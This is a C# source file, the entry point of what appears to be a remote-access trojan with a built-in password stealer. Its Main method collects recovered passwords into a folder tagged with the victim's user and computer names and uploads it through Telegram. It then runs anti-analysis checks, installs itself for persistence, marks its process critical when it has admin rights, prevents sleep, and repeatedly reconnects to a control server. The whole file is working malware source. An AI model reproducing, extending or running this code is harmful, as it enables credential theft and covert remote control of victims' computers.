using System;
using System.IO;
using System.Net;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Client.Install;
using Client.Modules.Manager;
using Client.Modules.Passwords.Helpers;

namespace Client;

public class Program
{
	private static string PasswordsStoreDirectory = Path.Combine(Paths.InitWorkDir(), SystemInfo.username + "@" + SystemInfo.compname + "_" + SystemInfo.culture);

	public static void Main()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
		{
			Thread.Sleep(1000);
		}
		if (!Settings.InitializeSettings())
		{
			Environment.Exit(0);
		}
		try
		{
			telegram.UploadFile(Save());
			if (!MutexControl.CreateMutex())
			{
				Environment.Exit(0);
			}
			if (Convert.ToBoolean(Settings.Anti))
			{
				Anti_Analysis.RunAntiAnalysis();
			}
			if (Convert.ToBoolean(Settings.Install))
			{
				NormalStartup.Install();
			}
			if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
			{
				ProcessCritical.Set();
			}
			Methods.PreventSleep();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				if (!ClientSocket.IsConnected)
				{
					ClientSocket.Reconnect();
					ClientSocket.InitializeClient();
				}
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	public static string Save()
	{
		Console.WriteLine("Running passwords recovery...");
		if (!Directory.Exists(PasswordsStoreDirectory))
		{
			Directory.CreateDirectory(PasswordsStoreDirectory);
		}
		else
		{
			try
			{
				Filemanager.RecursiveDelete(PasswordsStoreDirectory);
			}
			catch
			{
				Console.WriteLine("Failed recursive remove directory");
			}
		}
		if (Client.Modules.Passwords.Helpers.Report.CreateReport(PasswordsStoreDirectory))
		{
			return PasswordsStoreDirectory;
		}
		return "";
	}
}
